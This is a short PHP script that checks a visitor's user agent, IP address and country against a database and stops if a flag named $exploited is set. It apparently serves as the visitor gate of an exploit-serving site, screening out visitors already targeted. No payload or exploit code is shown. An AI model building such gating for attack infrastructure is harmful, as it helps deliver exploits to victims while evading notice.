<?


include_once('config.php');
include_once('include/sql.php');
include_once('include/visitors.php');
$sql = new CSQL($sqlSettings);
$sql->open();
	
$cvisitors = new CVisitors($sql, $sqlSettings);
$exploited = $cvisitors->checkVisitor($_SERVER['HTTP_USER_AGENT'], $cvisitors->getIpAddr(), $cvisitors->getIpAddrCountry($cvisitors->getIpAddr()));
$sql->close();

if($exploited){
	exit();
}
?>
